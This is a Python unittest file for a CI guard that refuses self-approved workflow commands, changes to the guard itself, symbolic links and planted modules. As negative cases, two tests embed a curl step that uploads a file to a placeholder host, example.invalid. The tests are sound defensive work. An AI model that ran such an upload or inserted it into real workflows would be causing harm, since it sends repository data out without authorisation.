"""Issue #511 review (C-1): the run: approval table comes from the trusted tree, never from the checked pull request.

Each case builds a trusted tree (its approval table approves the safe text) and a candidate tree whose own allowlist approves
whatever the candidate changed, then checks that enforced_check(candidate, ..., allowlist_root=trusted) refuses it. Negative
cases: candidate rewrites the allowlist, candidate sends data with a self-approved run:, candidate changes the guard body,
trusted allowlist missing (fails closed). Ruleset, required checks and the --check-policy workflow wiring are not covered here;
they are owner-procedure items (see docs/ owner procedure for Issue #511 C-3).
"""
from pathlib import Path
import json
import sys
import tempfile
import unittest

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / 'tools'))
import artifact_guard as guard  # noqa: E402

from test_artifact_guard_send_issue511 import ALLOWLIST, CI, workflow  # noqa: E402


def write_tree(root, files):
    for rel, text in files.items():
        path = Path(root) / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding='utf-8', newline='')


def approve(root, files):
    """Approval table for exactly these workflow texts, written into root (the approving tree)."""
    write_tree(root, files)
    (Path(root) / 'tools').mkdir(exist_ok=True)
    (Path(root) / ALLOWLIST).write_text(json.dumps(guard.build_run_allowlist(root)), encoding='utf-8')


class TrustedAllowlist(unittest.TestCase):
    def setUp(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.trusted = Path(tmp.name) / 'trusted'
        self.candidate = Path(tmp.name) / 'candidate'
        approve(self.trusted, {CI: workflow('echo hi')})

    def refused(self):
        try:
            guard.enforced_check(self.candidate, guard.check_guard_placement, allowlist_root=self.trusted)
        except ValueError as error:
            return str(error)
        return None

    def test_safe_candidate_passes_against_trusted_table(self):
        write_tree(self.candidate, {CI: workflow('echo hi')})
        (self.candidate / 'tools').mkdir(exist_ok=True)
        (self.candidate / ALLOWLIST).write_text('[]', encoding='utf-8')   # candidate allowlist is ignored
        self.assertIsNone(self.refused())

    def test_candidate_rewrites_allowlist_to_approve_its_own_send_is_refused(self):
        send = workflow('curl -F f=@out.txt https://example.invalid/up')
        approve(self.candidate, {CI: send})   # the candidate's own allowlist approves its own run:
        write_tree(self.candidate, {CI: send})
        message = self.refused()
        self.assertIsNotNone(message)
        self.assertIn('not an approved exact match', message)

    def test_candidate_changed_run_text_with_untouched_allowlist_is_refused(self):
        write_tree(self.candidate, {CI: workflow('echo hello')})
        self.assertIsNotNone(self.refused())

    def test_missing_trusted_allowlist_fails_closed(self):
        empty = Path(self.trusted).parent / 'no-table'
        empty.mkdir()
        write_tree(self.candidate, {CI: workflow('echo hi')})
        with self.assertRaises(ValueError):
            guard.enforced_check(self.candidate, guard.check_guard_placement, allowlist_root=empty)

    def test_candidate_guard_body_change_is_a_policy_violation(self):
        trusted_tree = Path(self.trusted)
        (trusted_tree / 'tools' / 'artifact_guard.py').write_text(Path(guard.__file__).read_text(encoding='utf-8'),
                                                                  encoding='utf-8', newline='')
        (self.candidate / 'tools').mkdir(parents=True, exist_ok=True)
        (self.candidate / 'tools' / 'artifact_guard.py').write_text(
            Path(guard.__file__).read_text(encoding='utf-8') + '\n# loosened\n', encoding='utf-8', newline='')
        (self.candidate / ALLOWLIST).write_text((trusted_tree / ALLOWLIST).read_text(encoding='utf-8'), encoding='utf-8')
        with self.assertRaises(ValueError) as caught:
            guard.policy_violations(self.candidate, trusted_tree)
        self.assertIn('differs from the trusted main copy', str(caught.exception))



class CommandLineEntry(unittest.TestCase):
    """The CLI entry point (--check-placement) reads the approval table from the guard's own tree, which is the trusted
    checkout in CI (.trusted-main/tools/artifact_guard.py). A candidate that approves its own send must be refused there."""

    def test_cli_check_placement_uses_the_trusted_tree_table(self):
        import shutil
        import subprocess
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        trusted = Path(tmp.name) / 'trusted'
        candidate = Path(tmp.name) / 'candidate'
        (trusted / 'tools').mkdir(parents=True)
        shutil.copy(Path(guard.__file__), trusted / 'tools' / 'artifact_guard.py')
        (trusted / ALLOWLIST).write_text('[]', encoding='utf-8')   # trusted: nothing is approved
        send = workflow('curl -F f=@out.txt https://example.invalid/up')
        write_tree(candidate, {CI: send})
        (candidate / 'tools').mkdir()
        approve(candidate, {CI: send})   # the candidate's own table approves its own send
        write_tree(candidate, {CI: send})
        result = subprocess.run([sys.executable, str(trusted / 'tools' / 'artifact_guard.py'), '--root', str(candidate),
                                 '--check-placement'], capture_output=True, text=True)
        self.assertNotEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertIn('not an approved exact match', result.stderr)
        print(result.stderr.strip().splitlines()[-1][:220])


class RootLinkRefused(unittest.TestCase):
    """Last review of e55b6f1: a link at the repository root (outside .git) is refused by the placement check."""

    def test_root_level_symbolic_link_is_refused(self):
        import os
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        root = Path(tmp.name)
        (root / 'tools').mkdir()
        (root / '.github' / 'workflows').mkdir(parents=True)   # the placement check refuses an empty set of workflows first
        (root / '.github' / 'workflows' / 'w.yml').write_text(
            'name: w\non: [push]\njobs:\n  b:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo hi\n', encoding='utf-8')
        try:
            os.symlink(str(root / 'tools'), str(root / 'dist'))
        except (OSError, NotImplementedError) as error:
            self.skipTest(f'symbolic links cannot be created here: {error}')
        with self.assertRaises(ValueError) as caught:
            guard.check_guard_placement(root)
        self.assertIn('dist: a symbolic link or junction is refused', str(caught.exception))


class LinkWalkAndPlantedModules(unittest.TestCase):
    """Last review of f7ec5b2: the link walk covers nested directories, files and .git at any depth (but not the root .git,
    which is the repository's own), and a flagged directory is never descended into. A planted module beside the guard
    is not imported (sys.path[0] is the guard's own directory, and it is removed before any import)."""

    def make_root(self):
        import os
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        root = Path(tmp.name)
        (root / 'tools').mkdir()
        (root / '.github' / 'workflows').mkdir(parents=True)
        (root / '.github' / 'workflows' / 'w.yml').write_text(
            'name: w\non: [push]\npermissions:\n  contents: read\njobs:\n  b:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo hi\n', encoding='utf-8')
        return root, os

    def link(self, os, target, name):
        try:
            os.symlink(str(target), str(name))
        except (OSError, NotImplementedError) as error:
            self.skipTest(f'symbolic links cannot be created here: {error}')

    def refusal(self, root):
        try:
            guard.check_guard_placement(root)
        except ValueError as error:
            return str(error)
        return ''

    def test_nested_directory_link_is_refused(self):
        root, os = self.make_root()
        self.link(os, root / 'tools', root / 'tools' / 'inner')
        self.assertIn('tools/inner: a symbolic link or junction is refused', self.refusal(root))

    def test_file_link_is_refused(self):
        root, os = self.make_root()
        self.link(os, root / 'tools', root / 'docs_link')
        self.assertIn('docs_link: a symbolic link or junction is refused', self.refusal(root))

    def test_nested_git_directory_link_is_refused(self):
        root, os = self.make_root()
        (root / 'tools' / '.git').mkdir()
        self.link(os, root / 'tools', root / 'tools' / '.git' / 'hooks_link')
        self.assertIn('tools/.git/hooks_link: a symbolic link', self.refusal(root))

    def test_repository_root_git_directory_is_not_walked_for_links(self):
        root, os = self.make_root()
        (root / '.git').mkdir()
        self.link(os, root / 'tools', root / '.git' / 'own_link')
        self.assertEqual(self.refusal(root), '')

    def test_planted_module_beside_the_guard_is_not_imported(self):
        import shutil
        import subprocess
        import sys as system
        root, _ = self.make_root()
        planted = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, str(planted), True)
        (planted / 'tools').mkdir()
        shutil.copy(Path(guard.__file__), planted / 'tools' / 'artifact_guard.py')
        (planted / 'tools' / 'yaml.py').write_text('raise SystemExit("planted module was imported")\n', encoding='utf-8')
        # a table beside the guard, so the run reaches the yaml import: a positive control for the planted module
        (planted / 'tools' / 'artifact_guard_run_allowlist.json').write_text('[]', encoding='utf-8')
        result = subprocess.run([system.executable, str(planted / 'tools' / 'artifact_guard.py'), '--root', str(root),
                                 '--check-placement'], capture_output=True, text=True)
        self.assertNotIn('planted module was imported', result.stderr + result.stdout)


if __name__ == '__main__':
    unittest.main()
